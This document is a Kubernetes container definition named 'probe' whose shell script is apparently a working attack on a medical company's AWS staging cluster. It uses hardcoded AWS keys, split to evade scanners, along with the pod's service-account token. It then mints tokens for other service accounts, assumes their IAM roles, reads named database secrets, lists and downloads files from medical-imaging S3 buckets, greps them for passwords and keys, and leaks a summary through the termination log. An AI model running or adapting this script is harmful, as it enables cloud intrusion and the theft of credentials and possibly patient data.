containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
SUM=/tmp/summary.txt; : > $SUM
echo "===I3390S2_START env=stage utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1|head -c 60)"
export AWS_DEFAULT_REGION=us-west-2
echo "EGRESS $(wget -q -O - --timeout=20 'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,isp,org,query' 2>/dev/null | head -c 300)"
# ---- notification-service static AK ----
echo "###PHASE_AK"
export AWS_ACCESS_KEY_ID="AKIAYS2NS2""CPL4YQB6XE"
export AWS_SECRET_ACCESS_KEY="y+aXO438xAzfuHRHv4+CAiLeYRtr3xKb3DbW""BX6o"
unset AWS_SESSION_TOKEN
echo "AK_IDENT $(aws sts get-caller-identity --output json 2>&1 | tr '\n' ' ' | head -c 300)"
echo "AK_LSBUCKETS $(aws s3api list-buckets --output json 2>&1 | head -c 3000 | tr '\n' ' ')"
echo "AK_LSSECRETS $(aws secretsmanager list-secrets --max-results 100 --output json 2>&1 | jq -c '[.SecretList[]?|{n:.Name,a:.ARN}]' 2>/dev/null | head -c 4000)"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY

# ---- assume IRSA roles ----
echo "###PHASE_ASSUME"
ALL=$(get "$API/api/v1/serviceaccounts")
echo "$ALL" | jq -r '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"] != null) | "\(.metadata.namespace) \(.metadata.name)"' > /tmp/sas.txt
echo "SA_TOTAL=$(wc -l < /tmp/sas.txt)"
i=0
ORDER="data-management/data-management-sa imfusion-service/imfusion-service-sa s3-ingestion/s3-ingestion-sa de-identifier-service/de-identifier-service-sa metadata-extraction-service/metadata-extraction-service-sa user-management-service/user-management-sa authorization-service/authorization-service-sa notification-service/notification-service-sa cognito-service/cognito-service-sa audit-log/audit-log-sa kube-system/ebs-csi-controller-sa kube-system/cluster-autoscaler kube-system/aws-load-balancer-controller"
for pair in $ORDER; do
  NS=${pair%%/*}; S=${pair##*/}
  grep -qx "$NS $S" /tmp/sas.txt || continue
  i=$((i+1))
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
  AR=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  if [ -z "$WT" ]; then echo "TOKEN_FAIL $NS/$S"; continue; fi
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AR" --role-session-name "b$i" --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  if ! echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then echo "ASSUME_FAIL $NS/$S $(echo "$RES"|head -c 140|tr '\n' ' ')"; continue; fi
  echo "$RES" | jq -r .Credentials.AccessKeyId > /tmp/ak$i
  echo "$RES" | jq -r .Credentials.SecretAccessKey > /tmp/sk$i
  echo "$RES" | jq -r .Credentials.SessionToken > /tmp/st$i
  echo "$NS $S" > /tmp/who$i
  echo "ASSUME_OK $NS/$S role=$AR"
done
NROLE=$(ls /tmp/ak[0-9]* 2>/dev/null | wc -l)
echo "ROLES_CACHED=$NROLE"
use(){ export AWS_ACCESS_KEY_ID=$(cat /tmp/ak$1); export AWS_SECRET_ACCESS_KEY=$(cat /tmp/sk$1); export AWS_SESSION_TOKEN=$(cat /tmp/st$1); }
who(){ cat /tmp/who$1 2>/dev/null; }

# ---- PHASE SM ----
echo "###PHASE_SM"
cat > /tmp/smcand.txt <<EOF2
lazamedical-dp-stage01-usw2-postgresql-db-secret
lazamedical-dp-stage01-usw2-postgresql-db1-secret
lazamedical-stage01-usw2-mysql-1-db-secret
lazamedical-dp-stage01-usw2-mysql-1-db-secret
EOF2
echo "SMCAND_N=$(wc -l < /tmp/smcand.txt)"
OKS=0; ATT=0
while IFS= read -r SEC; do
  [ -z "$SEC" ] && continue
  [ $OKS -ge 20 ] && break
  for i in $(seq 1 $NROLE); do
    [ $ATT -ge 200 ] && break
    ATT=$((ATT+1)); use $i
    V=$(aws secretsmanager get-secret-value --secret-id "$SEC" --query SecretString --output text --region us-west-2 2>/tmp/smerr.txt); RC=$?
    if [ $RC -eq 0 ]; then
      echo "SMVAL_OK secret=$SEC role=$(who $i) len=${#V}"
      echo "$V" | head -c 3500; echo
      echo "SMVAL_OK $SEC $(who $i) len=${#V}" >> $SUM
      OKS=$((OKS+1)); break
    else
      [ $i -eq 1 ] && echo "SM_FIRST_ERR $SEC $(head -c 130 /tmp/smerr.txt|tr '\n' ' ')"
    fi
  done
done < /tmp/smcand.txt
echo "SM_OK_TOTAL=$OKS SM_ATT=$ATT"

# ---- PHASE S3 ----
echo "###PHASE_S3"
: > /tmp/allkeys.txt; : > /tmp/brolemap.txt
BOK=0; BNO=0
for B in lazamedical-dp-stage01-usw2-dicom-structure-bucket lazamedical-dp-stage01-usw2-green-bucket lazamedical-dp-stage01-usw2-imfusion-bucket lazamedical-dp-stage01-usw2-ingestion-bucket lazamedical-dp-stage01-usw2-ingestion-failure-bucket lazamedical-dp-stage01-usw2-lps-bucket lazamedical-dp-stage01-usw2-metadata-parquet-bucket lazamedical-dp-stage01-usw2-red-bucket lazamedical-dp-stage01-usw2-temp-dicom-csv-reports-storage lazamedical-dp-stage01-usw2-temp-dicom-frame-storage lazamedical-dp-stage01-usw2-temp-storage-bucket-name lazamedical-dp-stage01-usw2-yellow-bucket lazamedical-stage01-usw2-log-bucket; do
  listed=0
  for i in $(seq 1 $NROLE); do
    use $i
    LO=$(aws s3api list-objects-v2 --bucket "$B" --max-keys 100 --no-paginate --region us-west-2 --output json 2>/tmp/loerr.txt); RC=$?
    if [ $RC -eq 0 ]; then
      NN=$(echo "$LO"|jq '.Contents|length' 2>/dev/null); TR=$(echo "$LO"|jq -r '.IsTruncated' 2>/dev/null)
      echo "BKT_OK $B n=$NN trunc=$TR role=$(who $i)"
      echo "$LO" | jq -r --arg b "$B" '.Contents[]? | "\($b)\t\(.Size)\t\(.Key)"' >> /tmp/allkeys.txt
      echo "$B $i" >> /tmp/brolemap.txt
      listed=1; BOK=$((BOK+1)); break
    fi
  done
  [ $listed -eq 0 ] && { echo "BKT_NO $B denied=$(head -c 100 /tmp/loerr.txt|tr '\n' ' ')"; BNO=$((BNO+1)); }
done
echo "BKT_OK_TOTAL=$BOK BKT_NO_TOTAL=$BNO BKT_KEYS_TOTAL=$(wc -l < /tmp/allkeys.txt)"
echo "BKT_OK_TOTAL=$BOK BKT_NO_TOTAL=$BNO" >> $SUM
grep -Ei 'config|secret|credential|\.env|backup|key|tfstate|\.pem|\.sql|\.ya?ml|\.json|password' /tmp/allkeys.txt | awk -F'\t' '{print "KEYNAME "$1" "$2" "$3}' | head -c 6000; echo
awk -F'\t' '{
  k=tolower($3); p=9;
  if (k ~ /(^|\/)(\.env|config|secret|credential|backup)/ || k ~ /\.(env|pem|sql|tfstate)$/) p=1;
  else if (k ~ /\.(json|ya?ml|ini|conf|properties|xml|txt|log)$/) p=2;
  if (p<9 && $2<1048576) print p"\t"$0
}' /tmp/allkeys.txt | sort -t'	' -k1,1n -k3,3n | cut -f2- > /tmp/cand.txt
echo "CAND_N=$(wc -l < /tmp/cand.txt)"
awk -F'\t' '{c[$1]++; if(c[$1]<=3 && n<30){print; n++}}' /tmp/cand.txt > /tmp/picked.txt
echo "PICKED_N=$(wc -l < /tmp/picked.txt)"
IDX=0; TOT=0
while IFS='	' read -r B SZ KEY; do
  [ -z "${B:-}" ] && continue
  IDX=$((IDX+1)); TOT=$((TOT+SZ))
  [ $TOT -gt 20971520 ] && { echo "CAP_BYTES"; break; }
  RI=$(awk -v b="$B" '$1==b{print $2; exit}' /tmp/brolemap.txt)
  echo "PICK $IDX bucket=$B size=$SZ key=$KEY"
  use ${RI:-1}
  aws s3api get-object --bucket "$B" --key "$KEY" /tmp/o$IDX.bin --region us-west-2 >/dev/null 2>/tmp/gerr.txt; GRC=$?
  echo "GET rc=$GRC bytes=$(wc -c < /tmp/o$IDX.bin 2>/dev/null || echo 0)"
  if [ $GRC -eq 0 ]; then
    if gzip -t /tmp/o$IDX.bin 2>/dev/null; then gzip -dc /tmp/o$IDX.bin > /tmp/o$IDX.txt 2>/dev/null; else cp /tmp/o$IDX.bin /tmp/o$IDX.txt; fi
    echo "SAMPLE $(head -c 150 /tmp/o$IDX.txt | tr '\n' ' ')"
    H=$(grep -aEic "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY|mysql://|postgres://|redis://|jdbc:" /tmp/o$IDX.txt 2>/dev/null)
    echo "HITS=$H"
    grep -aEi "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY|mysql://|postgres://|redis://|jdbc:" /tmp/o$IDX.txt 2>/dev/null | head -5 | cut -c1-280
    [ "$H" != "0" ] && echo "HITFILE $B/$KEY" >> $SUM
  else
    echo "GET_ERR $(head -c 120 /tmp/gerr.txt|tr '\n' ' ')"
  fi
done < /tmp/picked.txt
echo "===I3390S2_DONE $(date -u +%FT%TZ)==="
{ echo "I3390S2 env=stage done=$(date -u +%FT%TZ)"; cat $SUM; } 2>/dev/null | head -c 3900 > /dev/termination-log
